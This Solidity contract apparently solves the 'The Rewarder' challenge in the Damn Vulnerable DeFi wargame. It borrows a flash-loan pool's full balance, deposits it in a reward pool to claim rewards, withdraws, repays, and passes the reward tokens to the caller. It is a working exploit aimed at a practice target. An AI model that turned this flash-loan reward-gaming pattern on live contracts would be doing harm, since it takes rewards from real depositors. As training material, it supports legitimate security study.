// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";
import "./TheRewarderPool.sol";
import "./AccountingToken.sol";

contract RewardExploit {
    FlashLoanerPool flashPool;
    RewardToken rewardToken;
    TheRewarderPool pool;
    DamnValuableToken token;

    constructor(
        FlashLoanerPool _flashPool,
        TheRewarderPool _pool,
        RewardToken _rewardToken
    ) {
        flashPool = _flashPool;
        pool = _pool;
        rewardToken = _rewardToken;
        token = _flashPool.liquidityToken();
        token.approve(address(pool), type(uint256).max);
    }

    function exploit() public {
        uint256 maxLoan = token.balanceOf(address(flashPool));
        flashPool.flashLoan(maxLoan);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        pool.deposit(amount);
        // pool.distributeRewards();
        pool.withdraw(amount);
        token.transfer(address(flashPool), amount);
    }
}
